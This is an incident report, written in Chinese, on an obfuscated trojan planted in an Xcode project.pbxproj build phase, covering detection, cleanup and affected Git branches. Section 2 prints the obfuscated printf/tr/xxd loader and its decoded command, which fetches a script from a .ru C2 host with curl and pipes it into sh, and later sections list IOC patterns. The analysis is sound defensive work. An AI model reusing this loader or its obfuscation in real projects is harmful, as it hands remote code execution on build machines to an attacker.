# Xcode project.pbxproj 构建期木马变种事件报告（2026-10）

## 1. 结论

确认存在 **Xcode 构建期网络木马变种**，不是误报。  
载荷隐藏在 `project.pbxproj` 的 Run Script Build Phase + Build Setting 中，每次用 Xcode 编译目标时后台从境外域名拉取脚本并用 `sh` 执行。威胁面主要是 **开发机 / CI 构建机**，不是 App 业务逻辑本身。

本次已完成：

1. 加固 `mac-setup-security-toolkit` 的检测与清理逻辑（行为特征，覆盖混淆变种）。
2. 对当前磁盘上的 `~/Desktop/ResmartHealth` 工作区执行清理并通过复扫。
3. 说明：**脚本清的是工作区文件，不是 Git 全部分支**；远程多分支仍需单独处理。

---

## 2. 问题现象

- 仓库：`~/Desktop/ResmartHealth`
- 文件：`ResmartHealth.xcodeproj/project.pbxproj`
- 当前检出分支（清理时）：`main`
- 伪装阶段名：`Provision Library Executable`
- 恶意 Build Setting：`A3EA261`（Debug / Release 均有）

执行入口：

```text
shellScript = "...\nsh -c \"${A3EA261}\"";
```

混淆 Setting 值（摘要）：

```text
((t(){ `printf xx3d | tr -d 3` -p -r; }; echo <hex> | t | sh ) >/dev/null 2>&1 &)
```

`printf xx3d | tr -d 3` → `xxd`；hex 解码后的真实命令：

```bash
echo "$(curl --connect-timeout 23 -Lksf --retry 3 -d "p=xcode_phase" https://jhqt34n3qreu.ru/a)" | sh
```

特征：`.ru` C2、忽略证书（`-k`）、POST `p=xcode_phase`、管道进 `sh`、后台静默执行。

---

## 3. 根因与植入方式

| 项 | 内容 |
|----|------|
| 植入提交 | `3b734b7`（2026-09-29） |
| 提交说明 | `[update]优化返回“401 Authorization Required”问题` |
| 掩护手段 | 同提交含真实 Swift 网络/401 逻辑改动，夹带 `pbxproj` 恶意脚本 |
| 家族特征 | 与 2026-06 事件同源：`curl … -d "p=xcode_*" <C2> \| sh`，变量名/域名/混淆层轮换 |

历史同源 C2 / Setting 示例（曾出现或清理过）：

- Setting：`A3DC1C3`、`AF17F99`、`A3EA261`、`A870EE4`
- 域名片段：`amzndev`、`netcdnads`、`jhqt34n3qreu`、`googlenets`、`vigmanet`、`rigmanets`、`0je12fwoav7` 等
- 阶段伪装名：`Provision Library Executable`、`Build Target Libraries` 等

旧版 toolkit 漏检原因：只匹配字面量 `xxd -p -r`、明文 `curl|sh` 和固定键名；本次用 `printf|tr` + hex 绕过。

---

## 4. 影响范围

### 4.1 本机工作区（已清理）

- 清理前：`check` 报告 `Suspicious Xcode projects: 1`，`Conclusion: attention required`
- 清理后：工作区 `project.pbxproj` 中 IOC 为 0；`clean` 复扫 `Conclusion: clean`
- 备份路径：  
  `logs/security-incidents/security_incident_20261012_104251/backups/xcode-projects/`
- 当前 Git 状态：工作区已改干净，但 **尚未提交**；`HEAD` 仍含木马。

### 4.2 Git 分支（脚本不会自动清理）

脚本只改磁盘上当前检出的文件，**不 checkout 其他分支、不改历史**。

对 `origin/*` 的 `git grep`（IOC：`A3EA261|A870EE4|printf xx3d|jhqt34n3qreu|Provision Library Executable|Build Target Libraries`）结果摘要：

**仍含 IOC 的远程分支（示例）：**

- `origin/main`
- `origin/release/1.01.00`、`1.01.01`、`1.01.01-bugfix1`、`1.01.01_tmp`、`1.01.02`
- `origin/dev/olBleAccessory`、`origin/dev/sleepAnalysis`
- `origin/main-tj`

**未命中上述 IOC 的远程分支（示例）：**

- `origin/dev/sept`（此前有「移除可疑脚本」提交）
- `origin/sync_summary_optmization`
- `origin/fireware_upgrade`、`origin/dev/G5`、`origin/app_clip` 等

因此：

- **只在 main 工作区执行一次脚本 ≠ 全仓库干净。**
- `git checkout` 带毒分支或合并带毒分支，可能再次把木马写回工作区。
- 历史 commit 仍保留载荷；需要的话应在活跃分支上提交清理结果并推送，避免同事/CI 继续检出带毒文件。

---

## 5. 解决方案

### 5.1 Toolkit 脚本改动（已完成）

主要文件：

- `cleanup_security_incident.sh`：行为特征检测 + 按 Setting 值形状收集恶意键并删除 Phase/Rule/Setting
- `start.sh`：菜单 9/10 帮助文案更新（含工作区 vs 分支说明）
- `README.md` / `README.zh-CN.md` / `SECURITY_INCIDENT_REPORT.md`：文档同步

一键使用（关闭 Xcode 后）：

```bash
cd ~/Desktop/mac-setup-security-toolkit
./start.sh          # 选 9 检查，选 10 清理用户/项目
# 或
./cleanup_security_incident.sh check
./cleanup_security_incident.sh clean
```

### 5.2 ResmartHealth 仓库侧建议（需人工/后续提交）

1. 在当前 `main` 工作区确认 `pbxproj` 已干净后，**单独提交并推送**清理结果（勿与无关功能混提）。
2. 对每个仍带毒的活跃分支：checkout → 关 Xcode → 跑 toolkit `clean`（或 cherry-pick 清理提交）→ 提交 → 推送。
3. 合并时以「无恶意 Phase / Setting」为准；注意 `dev/sept` 等已清理分支与 `main` 合并冲突。
4. 曾在带毒工程上编译过的机器：建议再跑 toolkit `check`；若有 launchd/zsh 持久化再跑 `clean --system`。
5. **不要**在清理前 Archive / Jenkins 构建该工程。

分支自检示例（不必先 checkout）：

```bash
git -C ~/Desktop/ResmartHealth grep -nE \
  'A3EA261|A870EE4|printf xx3d|jhqt34n3qreu|Provision Library Executable' \
  origin/release/1.01.02 -- '*.pbxproj'
```

---

## 6. 验收记录（2026-10-12）

| 步骤 | 结果 |
|------|------|
| 旧 `XCODE_PATTERN` 对 ResmartHealth | `NO MATCH`（证明旧脚本漏检） |
| 新脚本 `check` | `Suspicious Xcode projects: 1`，exit 1 |
| 退出 Xcode 后 `clean` | 检出键 `A3EA261`，删除 phase `C65E565DEE3149B380162AE3` |
| `clean` 复扫 | `Conclusion: clean`，exit 0 |
| 工作区 `rg` IOC | 无命中 |
| `HEAD` 中 IOC | 仍存在（需 Git 提交才能让远程/他人生效） |

运行报告目录：

```text
logs/security-incidents/security_incident_20261012_104215/   # check
logs/security-incidents/security_incident_20261012_104251/   # clean
```

---

## 7. 后续建议

1. 将本 toolkit 改动纳入版本管理并在团队内同步。
2. 在 CI 增加对 `project.pbxproj` 的 IOC/行为扫描门禁（禁止合并含 `p=xcode_phase`、混淆 `printf|tr`+hex|sh 等模式的改动）。
3. 审查 `3b734b7` 作者环境是否持续被回写（此类木马常见于被感染 Mac 打开 Xcode 时再注入）。
4. 定期：`./cleanup_security_incident.sh check`。

---

## 8. 相关路径

| 路径 | 说明 |
|------|------|
| `~/Desktop/mac-setup-security-toolkit/cleanup_security_incident.sh` | 检测/清理实现 |
| `~/Desktop/mac-setup-security-toolkit/start.sh` | 交互入口（9/10/11） |
| `~/Desktop/ResmartHealth/ResmartHealth.xcodeproj/project.pbxproj` | 本次受害工程文件（工作区已清） |
| `SECURITY_INCIDENT_REPORT.md` | 历史事件与本次摘要 |
